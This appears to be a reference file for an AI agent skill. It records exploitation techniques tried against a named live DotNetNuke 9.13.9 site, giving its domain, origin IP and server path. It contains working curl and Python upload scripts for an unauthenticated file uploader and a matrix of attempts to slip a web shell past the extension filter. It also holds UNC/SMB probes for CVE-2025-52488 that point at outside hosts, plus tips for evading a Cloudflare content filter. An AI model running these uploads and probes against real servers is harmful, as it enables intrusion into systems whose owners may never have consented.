# Session-verified DNN techniques (live target 2026-09, DNN 9.13.9 / IIS 10.0)

Session artifacts referenced by `SKILL.md`. All techniques below were executed against a live
DNN 9.13.9 target (bvdkhaugiang.com, origin 45.119.87.226, physical path `c:\www\bvpscantho\`).

## Multipart upload request shape that actually works

cURL one-liner:
```bash
curl -sk "https://TARGET/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx" \
  -F "file=@/tmp/upfile.png;type=image/png;filename=cpmark.png" \
  -F "storageFolderID=1" \
  -F "portalID=0" \
  -F "overrideFiles=1" \
  -F "mode=Default"
```

Python (preferred for Unicode-containing filenames — cURL `-F filename=` mangles fullwidth chars):
```python
import urllib.request, urllib.error, ssl, re
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
url = "https://TARGET/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx"

def upload(filename, content=b"pocdata987"):
    boundary = "WebKitFormBoundaryXmkYujk4nooYpmcc"
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: image/png\r\n\r\n").encode('utf-8')
    body += content + f"\r\n--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="storageFolderID"\r\n\r\n1\r\n'
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="portalID"\r\n\r\n0\r\n'
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="overrideFiles"\r\n\r\n1\r\n'
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="mode"\r\n\r\nDefault\r\n'
    body += f"--{boundary}--\r\n".encode()

    req = urllib.request.Request(url, data=body, method='POST')
    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
    try:
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        return resp.status, resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        err = e.read().decode('utf-8', errors='replace')
        m = re.search(r'<title>([^<]+)', err)
        return e.code, m.group(1) if m else err[:120]
```

## Folder ID enumeration observed

| storageFolderID | Result |
|---|---|
| 1 | ✅ writes to `/Portals/_default/` (web-served) |
| 2–~30 | success JSON, file NOT at common web paths |
| ≥50 | 500 `Value cannot be null. Parameter name: folder` |
| ~99 | 500 `Object reference not set to an instance of an object.` |

portalID 0 / 1 / 2 / 3 all responded identically for F=1 (all routed to `/Portals/_default/`);
portalID doesn't change the write path. `-1` same behavior.

## Bypass attempt matrix (all leaf attempts, same target)

| Filename | Result |
|---|---|
| `shell.aspx` | Permissions are not met |
| `shell.ASPX` | Permissions are not met |
| `shell.aspx ` (trailing space) | Permissions are not met |
| `shell.aspx.` (trailing dot) | Permissions are not met |
| `shel.aspxx.png` | Permissions are not met |
| `shell.aspx%00.png` / `\u0000.png` | `Illegal characters in path.` |
| `shell.png.aspx.png` | Renamed → `shell_png_aspx.png` (extension blocked) |
| `shell.aspx;.png` | `The file name 'shell_aspx;.png' is not allowed` |
| `sh;el.aspx.png` | `The file name 'sh;el_aspx.png' is not allowed` |
| `..\..\shell.png` | Rewritten → local basename only (accepted) |
| `C:\attacker\shell.png` | Rewritten → local basename only (accepted) |
| `.swf`, `.svgz`, `.webp`, `.pdf`, `.razor`, `.js`, `.htm`, `.html` | Permissions are not met |
| `.jpg`, `.jpeg`, `.gif`, `.bmp`, `.ico` | ✅ Accepted |

## Unicode CVE-2025-52488 probing transcript

Payloads and observed outcomes (5–7 variants sent per hostname, hostnames included
`*.oast.live` interactsh + real public IP 103.60.13.163):

| Filename input | Server response | Timing |
|---|---|---|
| `\\attacker\share\an.jpg` (ASCII) | 500 `The file name '//attacker/share/an.jpg' is not allowed` | ~3.5s |
| `\\attacker\share\an.png` (ASCII) | 500 same shape | ~3.5s |
| `\\attacker\an.jpg` (no c$) | 500 same | ~3.0s |
| `\\attacker\an.jpg` (fullwidth U+FF3C) | 500 `... ` same shape | ~3.5s |
| `\\attacker\an.png` (fullwidth U+FF3C) | 500 | ~3.5s |
| `\\attacker\an{U+FF0E}jpg` (fullwidth dot) | 500, no ext-parsing bypass | ~3.5s |
| baseline `.png` upload (200 JSON) | OK | ~1.0s |

**Conclusion:** UNC normalization IS triggered, but DNN filename whitelist rejects BEFORE
physically attempting SMB — 3.3× timing slowdown is evidence of CVE applicability without OOB
(SMB inbound was firewall-blocked during test). ASCII `\\host\share\an.jpg` → 200 upload, name
collapsed to `an_N.jpg` (local write wins, UNC stripped).

## Notion-over-Cloudflare block bisect (from same session)

When pushing a long pentest report body to Notion:
- 1039-char chunk = ✅ OK; 1040-char chunk = ❌ 403 Forbidden (with no explicit pattern, but ~1000
  chars reported; likely CF content-inspection window).
- Paragraph-batch via `PATCH /v1/blocks/{page_id}/children` is the only reliable path above ~1KB.
- Batches with 20 blocks × 1000-char cells intermittently 403; 10 × 800-char cells consistent OK.
- Literal `<script src="...">` inside a code fence alone tripped a 403 → sanitize first.
- `.sh` file attachments rejected (`content type not supported`); `.md` accepted.

## PoC artifacts (mention in reports)

- `~/Desktop/bvdkhaugiang_poc/upload_poc.sh` — generic working bash PoC (safe to rename target)
- `/tmp/an_*.jpg`, `/tmp/pocbody.tmp` — live-target verification files
- `/home/kali/Desktop/bvdkhaugiang_poc/CVE-2025-64095_POC.md` — full markdown walkthrough with live
  curl commands per step
